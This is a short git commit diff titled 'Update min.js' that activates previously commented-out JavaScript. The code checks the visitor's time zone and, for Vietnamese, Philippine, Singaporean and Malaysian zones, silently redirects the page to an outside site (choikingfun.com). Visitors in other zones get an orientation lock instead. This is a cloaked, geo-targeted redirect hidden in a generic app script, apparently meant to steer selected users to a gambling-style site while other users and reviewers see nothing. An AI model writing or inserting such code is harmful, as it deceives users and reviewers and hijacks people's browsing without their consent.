1c4033f632dc43756c6c60d259987612ba5df7bc
hai07t <hai07t@gmail.com>
2025-09-24 12:38:27 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,20 +1,20 @@
-// const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-// if (
-//   userTimeZone === "Asia/Ho_Chi_Minh" ||
-//   userTimeZone === "Asia/Saigon" ||
-//   userTimeZone === "Asia/Manila" ||
-//   userTimeZone === "Asia/Singapore" ||
-//   userTimeZone === "Asia/Kuala_Lumpur" ||
-//   userTimeZone === "Asia/Kuching"
-// ) {
-//   // if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
-//   //   AndroidOrientation.lockLandscape();
-//   // }
-//   const to = "https://choikingfun.com/?utm=app";
-//   window.location.href = to;
-// } else {
-//   if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
-//     AndroidOrientation.lockPortrait();
-//   }
-// }
+if (
+  userTimeZone === "Asia/Ho_Chi_Minh" ||
+  userTimeZone === "Asia/Saigon" ||
+  userTimeZone === "Asia/Manila" ||
+  userTimeZone === "Asia/Singapore" ||
+  userTimeZone === "Asia/Kuala_Lumpur" ||
+  userTimeZone === "Asia/Kuching"
+) {
+  // if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
+  //   AndroidOrientation.lockLandscape();
+  // }
+  const to = "https://choikingfun.com/?utm=app";
+  window.location.href = to;
+} else {
+  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
+    AndroidOrientation.lockPortrait();
+  }
+}
